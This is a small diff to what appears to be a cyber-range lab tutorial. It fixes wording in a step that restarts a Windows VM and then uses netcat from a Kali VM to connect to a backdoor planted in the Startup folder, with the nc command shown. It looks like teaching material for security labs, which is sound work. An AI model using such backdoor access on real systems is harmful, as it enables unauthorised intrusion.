@@ -630,7 +630,7 @@ Please pay attention to how the long folder name with multiple words is quoted.
 
 To find where the startup folder is, press the Windows logo key  + R, type shell:startup, then select OK. This opens the Startup folder so that you can see where it is.
 
-3. Restart Windows VM, use *nc* at Kali VM log into the backdoor
+3. Restart Windows VM. Use *nc* at Kali VM to log into the backdoor
 ```
 ┌──(kali㉿Cyber-Range)-[~]
 └─$ nc 192.168.1.19 8080    
